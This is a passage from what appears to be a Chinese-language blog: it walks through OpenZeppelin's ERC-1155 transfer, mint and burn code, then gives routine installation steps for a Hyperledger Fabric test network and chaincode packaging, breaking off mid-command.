&quot;ERC1155: transfer to the zero address&quot;);<br><br>    address operator = _msgSender();<br>    uint256[] memory ids = _asSingletonArray(id);<br>    uint256[] memory amounts = _asSingletonArray(amount);<br><br>    _beforeTokenTransfer(operator, from, to, ids, amounts, data);<br><br>    uint256 fromBalance = _balances[id][from];<br>    require(fromBalance &gt;= amount, &quot;ERC1155: insufficient balance for transfer&quot;);<br>    unchecked &#123;<br>        _balances[id][from] = fromBalance - amount;<br>    &#125;<br>    _balances[id][to] += amount;<br><br>    emit TransferSingle(operator, from, to, id, amount);<br><br>    _afterTokenTransfer(operator, from, to, ids, amounts, data);<br><br>    _doSafeTransferAcceptanceCheck(operator, from, to, id, amount, data);<br>&#125;<br><br>/**<br> * @dev xref:ROOT:erc1155.adoc#batch-operations[Batched] version of &#123;_safeTransferFrom&#125;.<br> *<br> * Emits a &#123;TransferBatch&#125; event.<br> *<br> * Requirements:<br> *<br> * - If `to` refers to a smart contract, it must implement &#123;IERC1155Receiver-onERC1155BatchReceived&#125; and return the<br> * acceptance magic value.<br> */<br>function _safeBatchTransferFrom(<br>    address from,<br>    address to,<br>    uint256[] memory ids,<br>    uint256[] memory amounts,<br>    bytes memory data<br>) internal virtual &#123;<br>    require(ids.length == amounts.length, &quot;ERC1155: ids and amounts length mismatch&quot;);<br>    require(to != address(0), &quot;ERC1155: transfer to the zero address&quot;);<br><br>    address operator = _msgSender();<br><br>    _beforeTokenTransfer(operator, from, to, ids, amounts, data);<br><br>    for (uint256 i = 0; i &lt; ids.length; ++i) &#123;<br>        uint256 id = ids[i];<br>        uint256 amount = amounts[i];<br><br>        uint256 fromBalance = _balances[id][from];<br>        require(fromBalance &gt;= amount, &quot;ERC1155: insufficient balance for transfer&quot;);<br>        unchecked &#123;<br>            _balances[id][from] = fromBalance - amount;<br>        &#125;<br>        _balances[id][to] += amount;<br>    &#125;<br><br>    emit TransferBatch(operator, from, to, ids, amounts);<br><br>    _afterTokenTransfer(operator, from, to, ids, amounts, data);<br><br>    _doSafeBatchTransferAcceptanceCheck(operator, from, to, ids, amounts, data);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>最后会通过emit触发交易，然后调用_doSafeBatchTransferAcceptanceCheck来检查交易是否完成，可以看到这里会校验接受token的地址是否是一个合约地址，如果是一个合约地址却没有成功接收token则会通过revert进行回滚交易</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function _doSafeTransferAcceptanceCheck(<br>    address operator,<br>    address from,<br>    address to,<br>    uint256 id,<br>    uint256 amount,<br>    bytes memory data<br>) private &#123;<br>    if (to.isContract()) &#123;<br>        try IERC1155Receiver(to).onERC1155Received(operator, from, id, amount, data) returns (bytes4 response) &#123;<br>            if (response != IERC1155Receiver.onERC1155Received.selector) &#123;<br>                revert(&quot;ERC1155: ERC1155Receiver rejected tokens&quot;);<br>            &#125;<br>        &#125; catch Error(string memory reason) &#123;<br>            revert(reason);<br>        &#125; catch &#123;<br>            revert(&quot;ERC1155: transfer to non-ERC1155Receiver implementer&quot;);<br>        &#125;<br>    &#125;<br>&#125;<br><br>function _doSafeBatchTransferAcceptanceCheck(<br>    address operator,<br>    address from,<br>    address to,<br>    uint256[] memory ids,<br>    uint256[] memory amounts,<br>    bytes memory data<br>) private &#123;<br>    if (to.isContract()) &#123;<br>        try IERC1155Receiver(to).onERC1155BatchReceived(operator, from, ids, amounts, data) returns (<br>            bytes4 response<br>        ) &#123;<br>            if (response != IERC1155Receiver.onERC1155BatchReceived.selector) &#123;<br>                revert(&quot;ERC1155: ERC1155Receiver rejected tokens&quot;);<br>            &#125;<br>        &#125; catch Error(string memory reason) &#123;<br>            revert(reason);<br>        &#125; catch &#123;<br>            revert(&quot;ERC1155: transfer to non-ERC1155Receiver implementer&quot;);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="铸币操作-2"><a href="#铸币操作-2" class="headerlink" title="铸币操作"></a>铸币操作</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev Creates `amount` tokens of token type `id`, and assigns them to `to`.<br> *<br> * Emits a &#123;TransferSingle&#125; event.<br> *<br> * Requirements:<br> *<br> * - `to` cannot be the zero address.<br> * - If `to` refers to a smart contract, it must implement &#123;IERC1155Receiver-onERC1155Received&#125; and return the<br> * acceptance magic value.<br> */<br>function _mint(<br>    address to,<br>    uint256 id,<br>    uint256 amount,<br>    bytes memory data<br>) internal virtual &#123;<br>    require(to != address(0), &quot;ERC1155: mint to the zero address&quot;);<br><br>    address operator = _msgSender();<br>    uint256[] memory ids = _asSingletonArray(id);<br>    uint256[] memory amounts = _asSingletonArray(amount);<br><br>    _beforeTokenTransfer(operator, address(0), to, ids, amounts, data);<br><br>    _balances[id][to] += amount;<br>    emit TransferSingle(operator, address(0), to, id, amount);<br><br>    _afterTokenTransfer(operator, address(0), to, ids, amounts, data);<br><br>    _doSafeTransferAcceptanceCheck(operator, address(0), to, id, amount, data);<br>&#125;<br><br>/**<br> * @dev xref:ROOT:erc1155.adoc#batch-operations[Batched] version of &#123;_mint&#125;.<br> *<br> * Emits a &#123;TransferBatch&#125; event.<br> *<br> * Requirements:<br> *<br> * - `ids` and `amounts` must have the same length.<br> * - If `to` refers to a smart contract, it must implement &#123;IERC1155Receiver-onERC1155BatchReceived&#125; and return the<br> * acceptance magic value.<br> */<br>function _mintBatch(<br>    address to,<br>    uint256[] memory ids,<br>    uint256[] memory amounts,<br>    bytes memory data<br>) internal virtual &#123;<br>    require(to != address(0), &quot;ERC1155: mint to the zero address&quot;);<br>    require(ids.length == amounts.length, &quot;ERC1155: ids and amounts length mismatch&quot;);<br><br>    address operator = _msgSender();<br><br>    _beforeTokenTransfer(operator, address(0), to, ids, amounts, data);<br><br>    for (uint256 i = 0; i &lt; ids.length; i++) &#123;<br>        _balances[ids[i]][to] += amounts[i];<br>    &#125;<br><br>    emit TransferBatch(operator, address(0), to, ids, amounts);<br><br>    _afterTokenTransfer(operator, address(0), to, ids, amounts, data);<br><br>    _doSafeBatchTransferAcceptanceCheck(operator, address(0), to, ids, amounts, data);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="代币销毁-2"><a href="#代币销毁-2" class="headerlink" title="代币销毁"></a>代币销毁</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev Destroys `amount` tokens of token type `id` from `from`<br> *<br> * Emits a &#123;TransferSingle&#125; event.<br> *<br> * Requirements:<br> *<br> * - `from` cannot be the zero address.<br> * - `from` must have at least `amount` tokens of token type `id`.<br> */<br>function _burn(<br>    address from,<br>    uint256 id,<br>    uint256 amount<br>) internal virtual &#123;<br>    require(from != address(0), &quot;ERC1155: burn from the zero address&quot;);<br><br>    address operator = _msgSender();<br>    uint256[] memory ids = _asSingletonArray(id);<br>    uint256[] memory amounts = _asSingletonArray(amount);<br><br>    _beforeTokenTransfer(operator, from, address(0), ids, amounts, &quot;&quot;);<br><br>    uint256 fromBalance = _balances[id][from];<br>    require(fromBalance &gt;= amount, &quot;ERC1155: burn amount exceeds balance&quot;);<br>    unchecked &#123;<br>        _balances[id][from] = fromBalance - amount;<br>    &#125;<br><br>    emit TransferSingle(operator, from, address(0), id, amount);<br><br>    _afterTokenTransfer(operator, from, address(0), ids, amounts, &quot;&quot;);<br>&#125;<br><br>/**<br> * @dev xref:ROOT:erc1155.adoc#batch-operations[Batched] version of &#123;_burn&#125;.<br> *<br> * Emits a &#123;TransferBatch&#125; event.<br> *<br> * Requirements:<br> *<br> * - `ids` and `amounts` must have the same length.<br> */<br>function _burnBatch(<br>    address from,<br>    uint256[] memory ids,<br>    uint256[] memory amounts<br>) internal virtual &#123;<br>    require(from != address(0), &quot;ERC1155: burn from the zero address&quot;);<br>    require(ids.length == amounts.length, &quot;ERC1155: ids and amounts length mismatch&quot;);<br><br>    address operator = _msgSender();<br><br>    _beforeTokenTransfer(operator, from, address(0), ids, amounts, &quot;&quot;);<br><br>    for (uint256 i = 0; i &lt; ids.length; i++) &#123;<br>        uint256 id = ids[i];<br>        uint256 amount = amounts[i];<br><br>        uint256 fromBalance = _balances[id][from];<br>        require(fromBalance &gt;= amount, &quot;ERC1155: burn amount exceeds balance&quot;);<br>        unchecked &#123;<br>            _balances[id][from] = fromBalance - amount;<br>        &#125;<br>    &#125;<br><br>    emit TransferBatch(operator, from, address(0), ids, amounts);<br><br>    _afterTokenTransfer(operator, from, address(0), ids, amounts, &quot;&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IERC1155Receiver接口"><a href="#IERC1155Receiver接口" class="headerlink" title="IERC1155Receiver接口"></a>IERC1155Receiver接口</h2><p>有了 EIP-165 的支持，ERC-1155 仅需要支持智能合约的接收钩子。钩子函数必须返回一个预定义的 4 字节 magic 值，该值指定为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">bytes4(keccak256(&quot;onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)&quot;))<br></code></pre></td></tr></table></figure><p>当接收合约返回此值时，假定合约接受转账并知道如何处理 ERC-1155 代币，那么合约就不再会出现卡死的代币了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// ERC-1155<br>function onERC1155BatchReceived(<br>    address _operator,<br>    address _from,<br>    uint256[] calldata _ids,<br>    uint256[] calldata _values,<br>    bytes calldata _data<br>) external returns(bytes4);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Etherum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fabric测试环境的搭建</title>
    <link href="/2022/07/10/fabric%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/07/10/fabric%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="参考教程"><a href="#参考教程" class="headerlink" title="参考教程"></a>参考教程</h2><p><a href="https://juejin.cn/post/7033235760392175629#heading-1">Fabric测试环境的搭建流程 - 掘金 (juejin.cn)</a></p><p><a href="https://blog.csdn.net/u013137970/article/details/112634474">搭建fabric开发环境</a></p><h2 id="前提环境准备"><a href="#前提环境准备" class="headerlink" title="前提环境准备"></a>前提环境准备</h2><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs groovy">lsb_release -a | grep Codename | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> <span class="hljs-comment">//查看ubuntu的Codename</span><br><br>sudo cp <span class="hljs-regexp">/etc/</span>apt<span class="hljs-regexp">/sources.list /</span>etc<span class="hljs-regexp">/apt/</span>sources.list.b <span class="hljs-comment">// 备份原始文件</span><br><br>sudo chmod <span class="hljs-number">777</span> <span class="hljs-regexp">/etc/</span>apt<span class="hljs-regexp">/sources.list  /</span>/ 修改文件权限<br><br>sudo vi <span class="hljs-regexp">/etc/</span>apt<span class="hljs-regexp">/sources.list /</span>/ 用 vim 打开文件，删除文件中所有内容，替换为以下对应内容<br></code></pre></td></tr></table></figure><p><strong>国内的几个源：</strong><br><a href="http://mirrors.aliyun.com/">阿里源</a><br><a href="http://mirrors.ustc.edu.cn/">中科大源</a><br><a href="http://mirrors.163.com/">163源</a><br><a href="http://mirrors.tuna.tsinghua.edu.cn/">清华源</a></p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-comment">//我这里需要翻墙才能执行</span><br>sudo apt <span class="hljs-keyword">update</span><br><br>sudo apt upgrade<br><br>sudo apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span><br></code></pre></td></tr></table></figure><h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> git<br></code></pre></td></tr></table></figure><h3 id="安装cURL"><a href="#安装cURL" class="headerlink" title="安装cURL"></a>安装cURL</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> curl<br></code></pre></td></tr></table></figure><h3 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h3><p>查看系统中是否已经安装Docker：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">docker <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><p> 使用如下命令安装Docker的最新版本：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> docker.io<br></code></pre></td></tr></table></figure><p> 查看Docker版本信息：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">docker <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><p>修改为当前用户:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> usermod -aG docker 用户名<br></code></pre></td></tr></table></figure><p>注销重启:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><h3 id="安装Docker-compose"><a href="#安装Docker-compose" class="headerlink" title="安装Docker-compose"></a>安装Docker-compose</h3><p>确定系统中是否已安装docker－compose工具：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">docker-compose <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><p> 如系统提示未安装，则使用如下命令安装docker-compose工具：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> docker-compose<br></code></pre></td></tr></table></figure><p> 安装成功后，查看Docker－Compose版本信息：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">docker-compose <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><h3 id="安装Golang"><a href="#安装Golang" class="headerlink" title="安装Golang"></a>安装Golang</h3><p>创建Go目录</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">mkdir</span> $HOME/<span class="hljs-built_in">go</span><br></code></pre></td></tr></table></figure><p>使用wget工具下载Golang的最新版本压缩包文件 go1.14.4.linux-amd64.tar.gz</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://dl.google.com/go/go<span class="hljs-number">1</span>.<span class="hljs-number">14</span>.<span class="hljs-number">4</span>.linux-amd<span class="hljs-number">64</span>.tar.gz<br></code></pre></td></tr></table></figure><p>下载完成后，文件会保存在当前目录下。可以使用 ll 命令查看</p><p>使用 tar 命令将下载后的压缩包文件解压到指定的 /usr/local/ 路径下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> tar -zxvf go<span class="hljs-number">1</span>.<span class="hljs-number">14</span>.<span class="hljs-number">4</span>.linux-amd<span class="hljs-number">64</span>.tar.gz -C /usr/local/<br></code></pre></td></tr></table></figure><p>配置环境变量：解压后，Golang可以让系统的所有用户正常使用， 所以我们使用 vim 文件编辑工具打开系统的 profile 文件进行编辑：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo vim <span class="hljs-regexp">/etc/</span>profile<br></code></pre></td></tr></table></figure><p> 在profile文件最后添加如下内容:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">GOPATH</span>=<span class="hljs-variable">$HOME</span>/go<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">GOROOT</span>=/usr/local/go<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$GOROOT</span>/bin:$PATH<br></code></pre></td></tr></table></figure><p> 使用 source 命令，使刚刚添加的配置信息生效：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span> <span class="hljs-regexp">/etc/</span>profile<br></code></pre></td></tr></table></figure><p> 通过 go version命令验证是否成功：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">go</span> <span class="hljs-keyword">version</span><br></code></pre></td></tr></table></figure><h3 id="安装make"><a href="#安装make" class="headerlink" title="安装make"></a>安装make</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">sudo apt install make<br></code></pre></td></tr></table></figure><h3 id="安装g"><a href="#安装g" class="headerlink" title="安装g++"></a>安装g++</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">sudo apt install g++<br></code></pre></td></tr></table></figure><h3 id="安装libltdl-dev-库"><a href="#安装libltdl-dev-库" class="headerlink" title="安装libltdl-dev 库"></a>安装<code>libltdl-dev</code> 库</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">sudo apt-get install libltdl-dev<br></code></pre></td></tr></table></figure><h2 id="一键式部署Fabric"><a href="#一键式部署Fabric" class="headerlink" title="一键式部署Fabric"></a>一键式部署Fabric</h2><p>新建一个目录并进入：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">mkdir</span> hyperledger-fabric &amp;&amp; <span class="hljs-built_in">cd</span> hyperledger-fabric<br></code></pre></td></tr></table></figure><p>下载执行脚本，此脚本用来自动化下载 fabric 镜像、程序和测试网运行脚本等工具：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/hyperledger/</span>fabric<span class="hljs-regexp">/master/</span>scripts/bootstrap.sh<br></code></pre></td></tr></table></figure><p>给脚本添加执行权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chmod +x bootstrap.sh<br></code></pre></td></tr></table></figure><p>执行脚本，指定下载 v1.3.0 版本的相关工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./bootstrap.sh 1.3.0 1.3.0<br></code></pre></td></tr></table></figure><p><img src="/2022/07/10/fabric%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20220709143056454.png" alt="image-20220709143056454"></p><p>将fabric-samples中的可执行程序的路径添加到全局下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=/home/sissice/hyperledger-fabric/fabric-samples/bin:$PATH<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/../bin:$PATH<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">FABRIC_CFG_PATH</span>=<span class="hljs-variable">$PWD</span>/../config/<br></code></pre></td></tr></table></figure><h2 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cd</span> fabric<span class="hljs-literal">-samples</span>/<span class="hljs-built_in">test-network</span><br></code></pre></td></tr></table></figure><p>该目录下有一个<code>network.sh</code>脚本，可以拉起一个测试环境，具体如何使用可以参考<code>./network.sh --help</code></p><p>执行<code>./network.sh up </code>,脚本将帮我们自动拉起一个测试环境</p><p>可以用 <code>docker ps</code> 查看容器状态</p><p>用 <code>docker container rm xxx</code> 删除</p><p><img src="/2022/07/10/fabric%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20220709162901961.png" alt="image-20220709162901961"></p><p><code>./network.sh up </code> 该脚本将创建出一个<code>order</code>节点，两个<code>peer</code>节点，一个<code>cli</code>容器，用来和其他节点进行交互操作。</p><p>但是不会自动帮我们创建通道，如果需要自动帮我们创建通道，可以查看<code>network.sh</code>的帮助文档,比如，创建通道的命令为<code>./network.sh createChannel</code></p><p><img src="/2022/07/10/fabric%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20220709164626988.png" alt="image-20220709164626988"></p><p>至此，你就可以部署智能合约了</p><h2 id="chaincode操作流程"><a href="#chaincode操作流程" class="headerlink" title="chaincode操作流程"></a>chaincode操作流程</h2><p><a href="https://hyperledger-fabric.readthedocs.io/en/release-2.2/test_network.html#">官方文档</a></p><p><a href="https://juejin.cn/post/7049546118161498120#heading-0">Fabric chaincode操作流程</a></p><h3 id="启动测试环境并创建通道"><a href="#启动测试环境并创建通道" class="headerlink" title="启动测试环境并创建通道"></a>启动测试环境并创建通道</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cd</span> fabric<span class="hljs-literal">-samples</span>/<span class="hljs-built_in">test-network</span><br></code></pre></td></tr></table></figure><p>通过执行一下命令，会创建两个org组织，一个order节点，并且创建一个通道<code>channel1</code>，并将两个org组织的peer节点加入到channel1中，并且设置anchor peer锚节点。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">./network.<span class="hljs-keyword">sh</span> <span class="hljs-keyword">up</span> createChannel -<span class="hljs-keyword">c</span> channel1<br></code></pre></td></tr></table></figure><h3 id="打包chaincode"><a href="#打包chaincode" class="headerlink" title="打包chaincode"></a>打包chaincode</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">peer lifecycle chaincode package basic.tar.gz <span class="hljs-params">--path</span> <span class="hljs-string">../asset-transfer-basic/chaincode-go/</span> <span class="hljs-params">--lang</span> golang <span class="hljs-params">--label</span> basic_1.0<br></code></pre></td></tr></table></figure><p>上面的命令会将合约代码打包成<code>tar</code>文件,<code>--path</code>指定代码文件的路径，<code>label</code>是打包的标签，这个标签在后续中会使用到。</p><h3 id="安装chaincode"><a href="#安装chaincode" class="headerlink" title="安装chaincode"></a>安装chaincode</h3><p>首先在org1组织中进行安装</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ENABLED</span>=<span class="hljs-literal">true</span><br><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_LOCALMSPID</span>=<span class="hljs-string">&quot;Org1MSP&quot;</span><br><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt<br><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_MSPCONFIGPATH</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp<br><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_ADDRESS</span>=localhost:7051<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">peer 